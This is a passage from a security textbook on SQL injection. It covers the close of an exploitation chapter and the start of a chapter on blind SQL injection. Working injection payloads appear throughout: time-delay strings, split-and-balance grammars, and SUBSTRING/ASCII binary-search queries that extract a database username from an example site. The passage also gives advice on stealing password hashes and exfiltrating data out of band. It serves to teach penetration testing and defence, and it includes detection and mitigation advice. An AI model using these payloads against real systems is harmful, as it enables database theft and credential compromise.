on the value of a certain bit of information. We explored a number of different variants of this technique, as such responses can be different in terms of time needed to complete, in terms of success or failure, or in terms of contents of the returned page.  \nWe also discussed how it is possible to transfer data by starting a completely diffe rent \nconnection from the database server to the attacker’s machine, and how it is possible to rely on various protocols for this task, such as HTTP, SMTP, or database connections. \nYou can use all of these techniques, separately or in combination, to extrac t large amounts \nof data, starting from the enumeration of the database schema and then moving to the tables that you are most interested in. In case the user has only limited access on the remote database, you can try to expand your influence by escalating  your privileges, either by exploiting some \nvulnerability that has been left unpatched or by abusing specific functionality of the database. \nWhen these privileges have been obtained, the database password hashes become a very attractive target, as they can  be cracked and used to propagate the attack to other areas of the \ntarget network.  \n \n \n \nSolutions Fast Track  \nUnderstanding Common Exploit Techniques  \n• It is common for SQL injection vulnerabilities to occur in SELECT  statements, which do not \nmodify data. SQL in jection does also occur in statements that modify data such as INSERT , \nUPDATE , and DELETE, and although the same techniques will work care should be taken to \nconsider what this might do to the database. If possible, use an SQL injection on a SELECT  \nstateme nt. If not possible, some techniques can be used to reduce the danger of modification \nof data during the attack.  \n• It is very useful to have a local installation of the same database you are exploiting to test \ninjection syntax.  \n• If the back -end database and application architecture support chaining multiple statements \ntogether, exploitation will be significantly easier.  \nIdentifying the Database  \n• The first step in a successful attack should always consist of accurately fingerprinting the \nremote database se rver. \n• The most straightforward way consists of forcing the remote application to return a message \n(very often an error message) that reveals the database server technology.  \n• If that is not possible, the trick is to inject a query that works on only a specific database \nserver.  \nExtracting Data through UNION Statements  \n• To successfully append data to an existing query, the number of columns and their data type \nmust match.  \n• The value NULL  is accepted for all data types, whereas GROUP BY  is the quickest way to \nfind the exact number of columns to inject. \n• If the remote Web application returns only the first row, remove the original row by adding a \ncondition that always returns fal se, and then start extracting your rows one at a time.  \nUsing Conditional Statements  \n• Conditional statements allow the attacker to extract one bit of data for every request.  \n• Depending on the value of the bit you are extracting, you can introduce a delay, generate an \nerror, or force the application to return a different HTML page.  \n• Each technique is best suited for specific scenarios. Delay -based techniques are slow but \nvery flexible, whereas content -based techniques leave a slightly smaller footprint com pared \nto error- based ones.  \nEnumerating the Database Schema  \n• Follow a hierarchical approach: Start enumerating the databases, then the tables of each \ndatabase, then the columns of each table, and then finally the data of each column. \n• If the remote database is huge, you might not need to extract it in its entirety; a quick look at \nthe table names is usually enough to spot where the interesting data is.  \nInjecting into INSERT Queries  \n• If exploiting SQL injection in INSERT, UPDATE, or DELETE queries, care must be taken \nto avoid side effects such as filling the database with garbage, or mass alteration or deletion \nof content.  \n• Approaches for safely injecting include modifying INSERT or UPDATE queries to update a \nvalue that can be viewed elsewhere in the appli cation, or to modify an INSERT, UPDATE, \nor DELETE query so that the overall query fails, but either returns data or produces a noticeable difference to the user, such as a time delay or difference in error messages.  \nEscalating Privileges  \n• All major databa se servers have suffered from privilege escalation vulnerabilities in the past. \nThe one you are attacking might not have been updated with the latest security fixes. \n• In other cases, it may be possible to attempt to brute -force the administrative account; for \ninstance, using OPENROWSET  on SQL Server.  \nStealing the Password Hashes  \n• If you have administrative privileges, do not miss the chance to grab the password hashes. \nPeople tend to reuse their passwords and those hashes could be the keys to the kingdom.  \nOut-of-Band Communication  \n• If it’s not possible to extract data using the previous methods, try establishing a completely \ndifferent channel.  \n• Possible choices include e- mail (SMTP), HTTP, DNS, file system, or database -specific \nconnections.  \nSQL Injection  on Mobile Devices  \n• Many mobile and embedded devices uses local SQL databases to store or cache information.  \n• Although the method of accessing these is different, these mobile applications are exploitable \nvia SQL injection in the right conditions, just l ike any Web application.  \nAutomating SQL Injection Exploitation  \n• The majority of the attacks analyzed in this chapter require a high number of requests to \nreach their goal.  \n• Luckily, several free tools can assist in automating the attack.  \n• These tools provide a plethora of different attack modes and options, ranging from the \nfingerprint of the remote database server to the extraction of the data it contains. \nFrequently Asked Questions  \nQ: Is it necessary to always start the attack by fingerpr inting the database?  \nA: Yes. Detailed knowledge of the technology used by the target database server will allow \nyou to fine -tune a successful attack, resulting in a much more effective attack. Always invest \nsome time in the fingerprint phase; it will save you a lot of time later.  \nQ: Should I use UNION -based techniques when possible?  \nA: Yes, as they allow you to extract a reasonable amount of information with each request.  \nQ: What if the database is too big to enumerate all tables and columns?  \nA: Try enumerating tables and columns whose names match certain patterns. Adding further \nconditions such as like %password%  or like %private%  to your queries can help you to direct \nyour effort toward the most interesting data.  \nQ: How can I avoid data leakage through OOB  connections?  \nA: Making sure your applications properly sanitize user input is the first and most important \nline of defense. However, always make sure your database servers are not authorized to \ntransmit data outside the network. Do not allow them to send SMTP traffic to the outside, and configure your firewalls so that all potentially dangerous traffic is filtered.  \nQ: How easy is it to crack the password hashes, once I have retrieved them? \nA: It depends on a number of factors. If the hashing algorithm is weak retrieving the original \npassword is very easy. If the hashes have been generated with a cryptographically strong algorithm, it depends on the strength of the original password. However, unless a password complexity policy was enforced, chances are that at least some of the hashes will be cracked.  \n \n \n \n  \n \n  \n \n \nChapter 5  \nBlind SQL Injection Exploitation  \nMarco Slaviero  \nSolutions in this chapter:  \n• Finding and Confirming Blind SQL Injection  \n• Using Time -Based Techniques  \n• Using Response -Based Techniques  \n• Using Alternative Channels  \n• Automating Blind SQL Injection Exploitation  \nIntroduction  \nSo you’ve found a SQL injection point, but the application just gives you a generic error page? \nOr perhaps it gives you the page as normal, but there is a small difference in what you get back, visible or not? These are examples of blind SQL injection—wher e we exploit without \nany of the useful error messages or feedbacks that we saw in Chapter 4 . Don’t worry though —\nyou can still reliably exploit SQL injection even in these scenarios.  \nWe saw a number of classic SQL injection examples in Chapter 4  that rely on verbose error \nmessages to extract data as this was the first widely used attack technique for data extraction for these vulnerabilities. Before SQL injection was well understood, developers were advised \nto disable all verbose error messages in the mistaken belief that without error messages the attacker’s data retrieval goal was next to impossible. In some cases developers would trap errors within the application and display gener ic error messages while in other cases no errors \nwould be shown to the user. However, attackers soon realized that even though the error -based \nchannel was no longer available, the root cause still remained: attacker -supplied SQL was \nexecuting within a data base query. Figuring out new channels was left to the ingenuity of the \nattackers and a number of channels were discovered and published. Along the way the term Blind SQL injection  entered into common usage with slight differences in the definition used \nby each author. Chris Anley first introduced a blind SQL injection technique in a 2002 paper \nthat demonstrated how disabling verbose error messages could still lead to injection attacks \nand he provided several examples. Maor and Shulman’s definition required that verbose errors be disabled but that broken SQL syntax would yield a generic error page, and implicitly assumed that the vulnerable statement was a SELECT query whose result set was ultimately displayed to the user. The query’s result (either success o r failure) was then used to first derive \nthe vulnerable statement after which data was extracted through a UNION SELECT. Kevin Spett’s definition was similar in that verbose error messages were disabled and injection occurred in a SELECT statement; however  instead of relying on generic error pages his \ntechnique altered content within the page through SQL logic manipulations to infer data on a byte-by-byte basis which was identical to Hotchkies’ usage.  \nIt is clear that blind SQL injection has received signif icant attention from attackers and its \ntechniques are a key component in any SQL injection arsenal, however before delving into the specifics let us first define blind SQL injection and explore the scenarios in which it commonly occurs. In this chapter we cover techniques for extracting information from the backend database through the use of inference and alternative channels —including time delays, errors, \nDNS, and HTML responses. This gives us a flexible set of ways to communicate with the database, even in situations where the application is catching exceptions properly and we do \nnot have any feedback from the web interface that our exploits are working. \nNote  \nIn this book, blind SQL injection refers to those attack techniques that exploit a database query  input sanitization \nvulnerability to extract information from the database or extract information about the database query, without the \nuse of verbose database error messages or in -band data concatenation.  \nThis definition is intentionally broad as it makes  no assumptions about the specific SQL injection point (except \nthat SQL injection must be possible), does not require a particular server or application behavior and does not \ndemand specific techniques (apart from excluding error -based data extraction and the concatenation of data onto \nlegitimate results, for instance through a UNION SELECT). The techniques used for extracting information will \nbe quite varied with our sole guiding principle being the absence of the two classic extraction techniques.  \nKeep in  mind that blind SQL injection is mostly used to extract data from a database, but can also be used to \nderive the structure of the query into which we are injecting SQL. If the full query is worked out (including all \nrelevant columns and their types), in -band data concatenation generally becomes quite easy so attackers will \nstrive to determine the query structure before turning to more esoteric blind SQL injection techniques.  \nFinding and confirming blind SQL injection  \nIn order to exploit a blind SQL injecti on vulnerability we must first locate a potentially \nvulnerable point in the target application and verify that SQL injection is possible. This has \nalready been extensively covered in Chapter 2 , but it is worth reviewin g the main techniques \nused when testing for blind SQL injection specifically.  \nForcing Generic Errors  \nApplications will often replace database errors with a generic error page, but even the presence of an error page can allow you to infer whether SQL inject ion is possible. The simplest \nexample is the inclusion of a single quote in a piece of data that is submitted to the web application. If the application produces a generic error page only when the single quote or a variant thereof is submitted, then a reas onable chance of attack success is possible. Of course, \nthere are other reasons that a single quote would cause the application to fail (for example, where an application defense mechanism limits the input of single quotes), but by and large the most commo n source of errors when a single quote is submitted is a broken SQL query.  \nInjecting Queries with Side Effects  \nStepping towards confirmation of the vulnerability, it is generally possible to submit queries that have side effects observable by the attacker.  The oldest technique uses a timing attack to \nconfirm that execution of the attacker’s SQL has occurred, and it is also sometimes possible to execute operating system commands whose output is observed by the attacker. For example, in a Microsoft SQL Server  it is possible to generate a 5 -s pause with the SQL snippet:  \nWAITFOR DELAY ‘0:0:5’  \nLikewise, MySQL users could use the SLEEP() function which performs the same task in \nMySQL 5.0.12 and upwards, or the PostgreSQL pg_sleep() function from version 8.2 onwards.  \nFinally, the observed output can also be in- channel; for instance if the injected string:  \n‘ AND ‘1’=’2  \nis inserted into a search field and produces a different response from:  \n‘ OR ‘1’=’1  \nthen SQL injection appears very likely. The first string introduce s an always false  clause into \nthe search query which will return nothing, while the second string ensures that the search \nquery matches every row.  \nThis was covered in more detail in Chapter 2 . \nSplitting and Balancing  \nWhere generic errors or side effects are not useful, we can also try the “parameter splitting and balancing” technique as named by David Litchfield, and a staple of many blind SQL injection exploits. Splitting occurs when the legitimate input is broken up, and balancing ensures that the resulting query does not have trailing single quotes that are unbalanced. The basic idea is to gather legitimate request parameters  and then modify them with SQL keywords so that they \nare different from the original data although functionally equivalent when parsed by the database. By way of example, imagine that in the URL www.victim.com/view_review.aspx?id=5 the value of the id  parameter is inserted into a SQL \nstatement to form the following query:  \nSELECT review_content, review_author FROM reviews WHERE id=5  \nBy substituting 2  + 3 in place of 5, the input to the application is different from the original \nrequest, but the SQL is functionally equivalent:  \nSELECT review_ content, review_author FROM reviews WHERE id=2+3  \nThis is not limited to numeric data. Assume that the URL \nwww.victim.com/count_reviews.jsp?author=MadBob returns information relating to a \nparticular database entry, where the value of the author  parameter is placed into a SQL query \nto produce:  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘MadBob’  \nIt is possible to split the string MadBob with database- specific operators that provide \ndifferent inputs to the application that correspond to MadBob. An Oracle exploit using the ||  \noperator to concatenate two strings is:  \nMadB‘||’ob  \nThis yields the SQL query:  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘MadB’||‘ob’  \nwhich is functionally equivalent to the first query.  \nFinally, Litchfield also pointed out that the technique could be used to create exploit strings \nthat are virtually context -free. By using the splitting and balancing technique in combination \nwith subqueries it is possible to form exploits that are usable in many scenarios without \nmodification. The following MySQL queries will produce the same output:  \nSELECT review_content, review_author FROM reviews WHERE id=5  \nSELECT review_content, review_author FROM reviews WHERE id=10— 5 \nSELECT review_content, review_author FROM reviews WHERE id=5+(SELECT 0/1)  \nIn the final SQL statement above, a subquery was inserted. Since any subquery could be \ninserted at this point, the splitting and balancing technique provides a neat wrapper for \ninjecting more complex queries that actually extract data. However, MySQL does not allow us to split and balance string parameters (since it lacks a binary string concatenation operator), restricting the technique to numeric paramet ers only. Microsoft SQL Server, on the other hand, \ndoes permit the splitting and balancing of string parameters as the following equivalent queries show:  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘MadBob’  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘Mad’+CHAR(0x42)+‘ob’  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘Mad’+SELECT(‘B’)+‘ob’  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘Mad’+(SELECT(‘B’))+‘ob’  \nSELECT COUNT(id) FROM reviews WHERE review_author=‘Mad’+(SELECT ’’ )+‘Bob’  \nThe l ast statement above contains a superfluous subquery in bold that could be replaced with \na more meaningful exploit string, as we shall shortly see. A clear advantage of the split and balance approach is that even if the exploit string is inserted into a stored procedure call, it will still be effective.  \nTable 5.1 provides a number of split and balanced strings that contain a subquery \nplaceholder (<subquery>) for MySQL, PostgreSQL, Microsoft SQL Server, and Oracle. The \nproduction of the strings is given in simplified BNF (Backus -Naur Form) grammar.  \nWarning  \nLogical operators, although usable, are not suitable for numeric parameters as they depend on the value of \n<number>.  \nTable 5.1  Split and Balanced Strings with Subquery Placeholders  \nMySQ L \nINJECTION_STRING :: = TYPE_EXPR  \nTYPE_EXPR ::= STRING_EXPR | NUMBER_EXPR | DATE_EXPR  \nSTRING_EXPR ::= (see below)  \nNUMBER_EXPR ::= number NUMBER_OP (<subquery>)  \nDATE_EXPR ::= date ’ DATE_OP (<subquery>)  \nNUMBER_OP ::= + | –  | ∗ | / | & | “|” | ^ | xor  \nDATE_OP ::= + | –  | “||” | “|” | ^ | xor  \nIt is not possible to split and balance string parameters without side -effects. Subqueries can be \neasily executed but this would change  the result of the query. If the MySQL database was \nstarted in ANSI mode, then the || operator is available for string concatenation in subqueries:  \nSTRING_EXPR ::= string’ || (<subquery>) || ’  \nMySQ L \nPostgreSQL  \nINJECTION_STRING :: = TYPE_EXPR  \nTYPE_EXPR ::= STRING_EXPR | NUMBER_EXPR | DATE_EXPR  \nSTRING_EXPR ::= string’ || (<subquery>) || ’  \nNUMBER_EXPR ::= number NUMBER_OP (<subquery>)  \nDATE_EXPR ::= date ’ || (<subquery>) || ’  \nNUMBER_OP ::= + | –  | ∗ | / | ^ |% | & | # | “ |” \nSQL Server  \nINJECTION_STRING :: = TYPE_EXPR  \nTYPE_EXPR ::= STRING_EXPR | NUMBER_EXPR | DATE_EXPR  \nSTRING_EXPR ::= string’ + (<subquery>) + ’  \nNUMBER_EXPR ::= number NUMBER_OP (<subquery>)  \nDATE_EXPR ::= date ’ + (<subquery>) + ’  \nNUMBER_OP ::= + | –  | ∗ | / | & | “|” | ^ \nMySQ L \nOracle  \nINJECTION_STRING :: = TYPE_EXPR  \nTYPE_EXPR ::= STRING_EXPR | NUMBER_EXPR | DATE_EXPR  \nSTRING_EXPR ::= string’ || (<subquery>) || ’  \nNUMBER_EXPR ::= number NUMBER_OP (<subquery>)  \nDATE_EXPR ::= date ’ || (<subquery>) || ’  \nNUMBER_OP ::= + | –  | ∗ | / | “||” \nCommon Blind SQL Injection Scenarios  \nHere are three common scenarios in which blind SQL injection is useful:  \n1. When submitting an exploit that renders the SQL query invalid a generic error page is \nreturned, while submitting correct SQL returns a page whose content is controllable to some \ndegree. This is commonly seen in pages where information is displayed based on the user’s selection; for example clicking through to a product description, or viewing the results of a search. In both cases, the user can control the output provided by the page in the sense that the page is built on user -supplied information, and contains data retrieved in response to, \nsay, a provided product id . \nSince the page provides feedback (albeit not in the verbose database error message format) it is possible to use either a time -based confirmation exploit or an exploit that modifies the \ndataset displayed by the page. For instance, an attack might display the product desc ription \nof either soap or brushes, to indicate whether a 0 -bit or a 1- bit is being extracted. Oftentimes \nsimply submitting a single quote is enough to unbalance the SQL query and force the generic error page, which helps in inferring the presence of a SQL injection vulnerability.  \n2. A generic error page is returned when submitting an exploit that renders the SQL query \ninvalid, while submitting correct SQL returns a page whose content is not controllable . You \nmight encounter this on pages with multiple SQL  queries but only the first query is \nvulnerable and it does not produce output. A second common instance of this scenario is \nSQL injection in UPDATE or INSERT statements, where submitted information is written into the database and does not produce output, but could produce generic errors.  \nUsing a single quote to generate the generic error page might reveal pages that fall into this category, as will time -based exploits, but content -based attacks are not successful.  \n3. Submitting broken or correct SQL does not produce an error page or influence the output of \nthe page in any way. Since errors are not returned in this category of blind SQL injection scenarios, time -based exploits or exploits that produce out -of-band side -effects are the most \nsuccessful at identi fying vulnerable parameters.  \nBlind SQL Injection Techniques  \nHaving looked at the definition of blind SQL injection as well as how to find this class of vulnerabilities, it is time to delve into the techniques by which these vulnerabilities are exploited. T he techniques are split into two categories: inference techniques and alternative or \nout-of-band channel techniques. Inference attacks use SQL to ask questions about the database \nand slowly extract information one bit at a time, while out- of-band attacks u se mechanisms to \ndirectly extract large chunks of information through an available out -of-band channel.  \nChoosing which technique is best for a particular vulnerability is dependent on the behavior \nof the vulnerable resource. In trying to decide which appro ach to follow, one should ask \nwhether the resource returns a generic error page on submission of broken SQL snippets, and whether the resource allows us to control the output of the page to some degree.  \nInference Techniques  \nAt their core, all the inference techniques have the ability to extract at least one bit of information by observing the response to a specific query. Observation is key, as the response will have a particular signature when the bit in question is 1, and a  different response when the \nbit is 0. The actual difference in response is dependent on the inference device we choose to use, but the chosen means are almost always based on response time, page content or page errors, or a combination of these.  \nIn general, inference techniques allow us to inject a conditional branch into a SQL \nstatement, offering two paths where the branch condition is rooted in the status of the bit we \nare interested in. In other words, we insert a pseudo IF statement into the SQL query:  IF x \nTHEN y ELSE z. Typically x (converted into the appropriate SQL) says something along the \nlines of “Is the value of Bit 2 of Byte 1 of some cell equal to 1?” and y  and z are two separate \nbranches whose behavior is sufficiently different that the attacker can infer which branch was taken. After the inference exploit is submitted the attacker observes which response was returned, y or z. If the y branch was followed then the attacker knows that the value of the bit \nwas 1, otherwise the bit was 0. The sam e request is then repeated except that the next bit under \nexamination is shifted one over.  \nKeep in mind that the conditional branch does not have to be an explicit conditional syntax \nelement such as an IF statement. Although it is possible to use a “proper ” conditional \nstatement, this will generally increase the complexity and  length of the exploit; often we can \nget equivalent results with simpler SQL that emulates a formal IF statement.  \nThe bit of extracted information is not necessarily a bit of data stor ed in the database \n(although that is the common usage); we can also ask questions such as “Are we connecting to the database as the administrator?” or “Is this a SQL Server 2008 database?” or “Is the value of a given byte above 127?” Here the bit of inform ation that is extracted is not from a database \nrecord, rather it is configuration information or information about data in the database, or metadata. However asking these questions still relies on the fact that we can supply a conditional branch into the e xploit so that the answer to the question is either TRUE or \nFALSE. Thus, the inference question is a SQL snippet that returns TRUE or FALSE based on \na condition supplied by the attacker.  \nLet us distill this into a concrete example using a simple technique.  We shall focus on an \nexample page count_chickens.aspx  which is used to track the well -being of chicken eggs on an \negg farm. Each egg has an entry in the chickens  table and among various columns is the status  \ncolumn that takes the value Incubating for unha tched eggs. A count is displayed when \nbrowsing to the URL:  \nhttp://www.victim.com/count_chickens.aspx?status=Incubating  \nIn this example, the status  parameter is vulnerable to blind SQL injection. \nWhen requested, the page queries the database with the following SELECT statement:  \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’  \nWhat we would like to accomplish is the extraction of the username that the page uses to \nconnect to the databa se. In our Microsoft SQL Server database there is a function \nSYSTEM_USER  that will return the login username in whose context the database session has \nbeen established. Normally we could view this with the SQL “SELECT SYSTEM_USER” but \nin this case the resu lts are not visible. Figure 5.1  depicts an attempt to extract data using the \nverbose error message technique but the page returns a standard error page. Unfortunately the developers followed bad security advice and ra ther than steering clear of dynamic SQL chose \ninstead to catch database exceptions and display a generic error message.  \n \nFigure 5.1  Unsuccessful Attempt to Extract Data Through Error Messages  \nWhen we submit status=Incubating the page executes the above SQL query and returns the \nstring shown in Figure 5.2. \n \nFigure 5.2  Response When Counting Unhatched Eggs  \nWe can alter the status  parameter such that the SQL query returns an empty result set by \nadding the ‘always false’ clause and ‘1’=‘2 to the legitimate query, yielding the SQL \nstatement: \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ and ‘1’=‘2’  \n\nThe response to thi s query is shown in Figure 5.3 and from the message we can infer that the \nquery returned an empty result set. Keep in mind that for two rows status  was Incubating but \nthe trailing false clause ensured that no rows would match.  \n \nFigure 5.3  Forcing an Empty Result Set  \nThis is a classic example of blind SQL injection as no ver bose database errors are returned \nbut we can still inject SQL into the query and we can alter the results returned to us (we either \nget an egg count or we get “No eggs have that status”). Instead of inserting an always false clause, we can insert a clause that is sometimes true and sometimes false. Since we are trying to derive the database username, we can ask whether the first character of the login is ‘a’ by submitting status=Incubating’ and SUBSTRING(SYSTEM_USER,1,1)=’a which generates the \nSQL statement : \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ and \nSUBSTRING(SYSTEM_USER,1,1)=‘a’  \nThis SQL snippet will extract the first character from the output of SYSTEM_USER using \nthe SUBSTRING() function. Apart from the string, the two parameters t o SUBSTRING are the \nstarting position, and the length of the string to extract.  \nIf the first character is indeed ‘a’, then the second clause is true and we would see the \npositive result from Figure 5.2, otherwise if t he character is not ‘a’ then the second clause is \nfalse and an empty result set would be returned which would yield the message shown in Figure 5.3. Assuming the first character was not ‘a’, we then submit a second pa ge query with \nour custom status  parameter asking whether the first character is ‘b’ and so forth until the first \ncharacter is found:  \nIncubating’ AND SUBSTRING(SYSTEM_USER,1,1)=’a (False)  \nIncubating’ AND SUBSTRING(SYSTEM_USER,1,1)=’b (False)  \n\nIncubating’ AND SUBSTRING(SYSTEM_USER,1,1)=’c (False)  \n \nIncubating’ AND SUBSTRING(SYSTEM_USER,1,1)=’s (True)  \nThe “False” and “True” conditions are states that are inferred by the content on the page \nafter each request is subm itted and do not refer to content within the page, i.e. if the response \ncontains “No eggs…” then the state was False otherwise the state was True.  \nAn important consideration is to decide on the alphabet that is used to search for characters. \nIf the data being extracted is text, then an alphabet in the language of the application’s \nuserbase is obvious. In addition, numbers and punctuation must also be considered and, if the \ndata is binary, non- printable or high characters too should be included. \nWe now shift  our attention to the second character and repeat the process starting at ‘a’ and \nmoving through the alphabet. As each successive character is found, the search moves onto the \nnext character. The page queries that reveal the username on our sample page are:  \nIncubating’ AND SUBSTRING(SYSTEM_USER,1,1)=’s (True)  \nIncubating’ AND SUBSTRING(SYSTEM_USER,2,1)=’q (True)  \nIncubating’ AND SUBSTRING(SYSTEM_USER,3,1)=’l (True)  \nIncubating’ AND SUBSTRING(SYSTEM_USER,4,1)=’0 (True)  \nIncubating’ AND SUBSTRING(SYSTEM_USER,8,1) =’8 (True)  \nEasy, isn’t it? The username is ‘sql08’. Unfortunately all is not as simple as one would like \nand we have skipped over a pretty important question. How do we know when the end of the username has been reached? If the portion of username discover ed so far is ‘sql08’, how can \nwe be sure that there is not a sixth, seventh or eighth character? The SUBSTRING() function will not generate an error if we ask it to provide characters past the end of the string, instead it returns the empty string ‘’. Ther efore we can include the empty string in our search alphabet \nand if it is found then we can conclude the end of the username has been found:  \nstatus=Incubating’ AND SUBSTRING(SYSTEM_USER,6,1)=’ (True)  \n\nThat appears to solve the problem, except it is not very  portable and depends on the explicit \nbehavior of a particular database function. A neater solution would be to first determine the \nlength of the username before extracting it. The advantage of this approach, apart from being applicable to a wider range of  scenarios than the “SUBSTRING() returns empty string” \napproach, is that it enables the attacker to estimate the maximum time that could possibly be spent in extracting the username. We can find the length of the username with the same technique we employe d to find each character, by testing whether the value is 1, 2, 3, and so on \nuntil we find a match:  \nstatus=Incubating’ AND LEN(SYSTEM_USER)=1--  (False)  \nstatus=Incubating’ AND LEN(SYSTEM_USER)=2--  (False)  \nstatus=Incubating’ AND LEN(SYSTEM_USER)=3--  (False)  \nstatus=Incubating’ AND LEN(SYSTEM_USER)=4--  (False)  \nstatus=Incubating’ AND LEN(SYSTEM_USER)=5--  (True)  \nFrom this sequence of requests it was possibly to infer that the length of the username was 5. \nNote as well the use of the SQL comment ( --) that, althoug h not required, makes the exploit a \nlittle simpler.  \nIt is worth reinforcing the point that the inference tool used to determine whether a given \nquestion was TRUE or FALSE was the presence in a webpage of either an egg count message or a message stating that no eggs matched the given status. This demonstrates that the mechanism for making an inference decision is highly dependent on the scenario and can often be substituted with a number of differing techniques. \nAre You Owned?  \nCounting Eggs and Requests  \nIf it is not already clear, the inference techniques described in this chapter are noisy and resource intensive; \nextracting one bit per request means that an attacker will have to send thousands of requests at a minimum, \nrunning into millions where megabytes o f data are retrieved. This helps in spotting such attacks using basic \nmetrics: requests per minute, database queries per minute, tracking database connection pool errors, and \nbandwidth utilization are all possible data points that can be monitored to evalu ate whether an inference attack is \nongoing.  \nFor large sites many of these metrics could well fall under the radar as the attack may not sufficiently spike the \nnumbers; it may also help to track requests per page as the inference attack will in all likelihood use a single \ninjection point to complete the attack.  \nIncreasing the Complexity of Inference Techniques  \nIt may have occurred to you that testing each character in the username against the entire \nalphabet (plus digits and possibly non -alphanumeric characters) is a pretty inefficient method \nfor extracting data. To retrieve the username we had to request the pa ge 115 times (5 for the \nlength and 19, 17, 12, 27, and 35 for the characters ‘s’, ‘q’, ‘l’, ‘0’, and ‘8’, respectively). A \nfurther consequence of this approach is that when retrieving binary data we could potentially have an alphabet of 256 characters, whi ch sharply increases the number of requests and in any \ncase is often not binary -safe. There are two methods that are used to improve the efficiency of \nretrieval through inference, a bit -by-bit method and a binary search method, and both methods \nare binary -safe. \nThe binary search method (also referred to in some places as the bisection algorithm) is \nmostly used to infer the value of single bytes without having to search through an entire alphabet. It successively halves the search space until the value of th e byte is identified, by \nplaying a game of eight questions. Since an 8- bit byte can have 1 of 256 values, the value will \nalways be determined in eight requests. This is intuitively demonstrated by counting the number of times one can successively divide 256 in 2 before a non- integer quotient is found. \nAssume the byte of interest has the value 14. We ask questions and infer the answer through a convenient inference mechanism, which will return “Yes” if the answer is true and “No” if the \nanswer is false. The game then proceeds like this:  \n1. Is the byte greater than 127? No, because 14  < 127. \n2. Is the byte greater than 63? No, because 14  < 63. \n3. Is the byte greater than 31? No, because 14  < 31. \n4. Is the byte greater than 15? No, because 14  < 15. \n5. Is the by te greater than 7? Yes, because 14  > 7. \n6. Is the byte greater than 11? Yes, because 14  > 11. \n7. Is the byte greater than 13? Yes, because 14  > 13. \n8. Is the byte greater than 14? No, because 14  = 14. \nSince the byte is greater than 13 but not greater than 14, we can infer that the byte has the \nvalue 14. This technique relies on a database function to provide the integer value of any byte; \nunder Microsoft SQL Server this is provided by the ASCII() function and likewise in MySQL, PostgreSQL, and Oracle.  \nIf we  return to the original problem of finding the database username, but now use the \nbinary search technique to find the first character of the username then we would like to execute the SQL statement:  \nSELECT COUNT(chick_id) FROM chickens WHERE status=‘Incubating’ AND \nASCII(SUBSTRING(system_user,1,1))>127-- ’ \nWe need to issue eight SQL statements in order to absolutely determine the character’s \nvalue; converting all these queries into page requests produces:  \nIncubating’ And ASCII(SUBSTRING(SYSTEM_USER,1,1))>127--  (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>63--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>95--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>111--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>119--  (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>115--  (False)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>113--  (True)  \nIncubating’ AND ASCII(SUBSTRING(SYSTEM_USER,1,1))>114--  (True)  \nFrom this series of requests we can infer that the byte value of the first character of the \nusername is 115 which, when converted to it’s ASCII table equivalent is ‘s’. Using this technique it is possible to extract a byte in exactly eight requests which is a vast improvement on comparing the full byte against an alphabet. Regardless of the value being extracted, if only two states can be observed then extraction will always take eight requests. Try for yourself with randomly chosen byte values.  \nIf we add a third state to the request (Error) then it is possible to test for equality in our \nbinary search thereby reducing the best -case number of requests to one request with eight \nrequests being a worst case. Interestingly, this will only reduce the expected num ber of \nrequests to about 7.035 for uniformly distributed data. An example of this is provided later.  \nThis is great. We have a method by which it is possible to efficiently extract the value of a \ngiven byte in a fixed time in as many requests as there are b its using a two -state channel. \nUnless we use compression or an injection string that handles more than two states this as good \nas it gets from an information theory perspective. However there is still a performance issue with the binary search technique si nce each request is dependent on the result of the previous \nrequest; we cannot make the second request before the answer to the first is known since our second request might be to test the byte against 63 or 191. Thus requests for a single byte cannot be r un in parallel and this violates our good sense . \nNote  \nWhile it is true that bytes could be requested in parallel, there is no good reason to stop there without attempting \nto parallelize bit requests. We look into this further below.  \nThis non- parallel requi rement is not an inherent limitation of inference techniques in \ngeneral, just the binary search approach. Extracted data remain constant in the database, in the sense that we are not changing them. Of course any application accessing the data could make alterations; if that is the case then all bets are off and all inference techniques become \nunreliable . \nOptimizing the binary search  \nA Little Cheating is Allowed  \nIt is not entirely true that characters always take eight requests to extract when two states are available. When the \ncontent being extracted is known to be text then some optimizations are possible, especially where the character \nset and collation are known. Instead of using all eight bits, we essentially make assumptions about where the text \ncharact ers reside in the set of all possible byte values and rely on string comparisons to implement the binary \nsearch method. This approach requires that the characters being extracted have an alphabet that is ordered and \nsupports character comparison. For examp le, if the data consists only of a case- sensitive Roman alphabet with \ndecimal digits, then 62 possible characters exist. The binary search for the first character of the username across \nthe alphabet “0…9A…Za…z” proceeds as follows:  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘U’ -- (True)  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘j’ -- (True)  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘s’ -- (False)  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘o’ -- (True)  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘q’ -- (True)  \nIncubating’ and SUBSTRING(SYSTEM_USER,1,1)>‘r’ -- (True)  \nCharacter is thus ‘s’  \nOf course, we’ve ignored punctuation in the alphabet queried above, but it permits extraction in at most six \nrequests.  \nIn some cases, the alphabet is predictable but does not ov erlap with an alphabet recognized by the database. \nFor example, if extracting MD5 hashes, the possible alphabet is only 16 characters. One can simulate alphabets \nwith SQL’s set construct and build the alphabets yourself. In the following example, the first character from an \nMD5 hash is extracted:  \nIncubating’ and SUBSTRING(‘c4ca4238a0b923820dcc509a6f75849b’,1,1) in (‘0’,‘1’,‘2’,‘3’,‘4’,‘5’,‘6’,‘7’);  \nIncubating’ and 